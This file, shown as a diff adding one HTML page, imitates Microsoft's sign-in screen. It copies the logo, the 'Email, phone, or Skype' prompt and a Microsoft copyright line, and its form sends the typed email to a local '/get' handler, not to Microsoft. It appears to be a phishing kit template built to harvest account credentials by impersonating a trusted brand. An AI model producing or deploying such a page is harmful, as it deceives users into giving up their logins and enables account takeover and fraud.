@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Sign in to your account</title>
+    <style>
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f2f2f2;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 440px;
+        padding: 44px;
+        background: #fff;
+        border-radius: 4px;
+      }
+      #logo {
+        margin-bottom: 16px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 600;
+        color: #1b1b1b;
+        margin-bottom: 12px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 6px 10px 6px 10px;
+        border: 1px solid #666;
+        border-bottom: 2px solid #666;
+        font-size: 15px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: #fff;
+        font-family: inherit;
+      }
+      .g-input:focus {
+        border-bottom-color: #0067b8;
+        border-color: #0067b8;
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 10px;
+        background-color: #0067b8;
+        color: #fff;
+        border: none;
+        border-radius: 2px;
+        font-size: 15px;
+        cursor: pointer;
+        font-family: inherit;
+      }
+      .gbtn-primary:hover {
+        background-color: #005a9e;
+      }
+      .checkbox {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        margin: 12px 0;
+        color: #616161;
+        font-size: 13px;
+      }
+      .checkbox input {
+        accent-color: #0067b8;
+      }
+      .link {
+        display: block;
+        color: #0067b8;
+        font-size: 13px;
+        text-decoration: none;
+        margin-bottom: 20px;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        padding-top: 20px;
+        border-top: 1px solid #e0e0e0;
+        font-size: 12px;
+        color: #616161;
+        text-align: center;
+      }
+      .footer a {
+        color: #616161;
+        text-decoration: none;
+      }
+      .footer a:hover {
+        text-decoration: underline;
+      }
+      .no-acct {
+        margin-top: 16px;
+        font-size: 14px;
+        color: #616161;
+      }
+      .no-acct a {
+        color: #0067b8;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <div id="logo">
+        <svg viewBox="0 0 23 23" width="23" height="23">
+          <rect x="0" y="0" width="11" height="11" fill="#f25022"/>
+          <rect x="12" y="0" width="11" height="11" fill="#7fba00"/>
+          <rect x="0" y="12" width="11" height="11" fill="#00a4ef"/>
+          <rect x="12" y="12" width="11" height="11" fill="#ffb900"/>
+        </svg>
+      </div>
+      <h1 class="g-h1">Sign in</h1>
+      <form action="/get" method="POST">
+        <input class="g-input" type="text" name="email" placeholder="Email, phone, or Skype" required>
+        <button type="submit" class="gbtn-primary">Next</button>
+      </form>
+      <a href="#" class="link">Can't access your account?</a>
+      <div class="footer">
+        <a href="#">Terms of use</a> &nbsp;|&nbsp; <a href="#">Privacy & cookies</a>
+        <br>© Microsoft
+      </div>
+    </div>
+  </body>
+</html>
